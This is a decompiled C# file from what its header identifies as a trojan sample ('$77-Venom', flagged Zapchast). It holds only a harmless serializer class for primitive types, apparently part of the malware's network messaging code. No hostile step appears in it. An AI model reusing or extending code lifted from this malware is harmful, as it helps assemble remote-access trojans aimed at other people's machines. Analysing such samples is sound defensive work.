// Decompiled with JetBrains decompiler
// Type: xClient.Core.NetSerializer.TypeSerializers.PrimitivesSerializer
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace xClient.Core.NetSerializer.TypeSerializers
{
  public class PrimitivesSerializer : IStaticTypeSerializer, ITypeSerializer
  {
    private static Type[] s_primitives = new Type[15]
    {
      typeof (bool),
      typeof (byte),
      typeof (sbyte),
      typeof (char),
      typeof (ushort),
      typeof (short),
      typeof (uint),
      typeof (int),
      typeof (ulong),
      typeof (long),
      typeof (float),
      typeof (double),
      typeof (string),
      typeof (DateTime),
      typeof (byte[])
    };

    public bool Handles(Type type) => ((IEnumerable<Type>) PrimitivesSerializer.s_primitives).Contains<Type>(type);

    public IEnumerable<Type> GetSubtypes(Type type)
    {
      yield break;
    }

    public void GetStaticMethods(Type type, out MethodInfo writer, out MethodInfo reader)
    {
      writer = Primitives.GetWritePrimitive(type);
      reader = Primitives.GetReaderPrimitive(type);
    }

    public static IEnumerable<Type> GetSupportedTypes() => (IEnumerable<Type>) PrimitivesSerializer.s_primitives;
  }
}
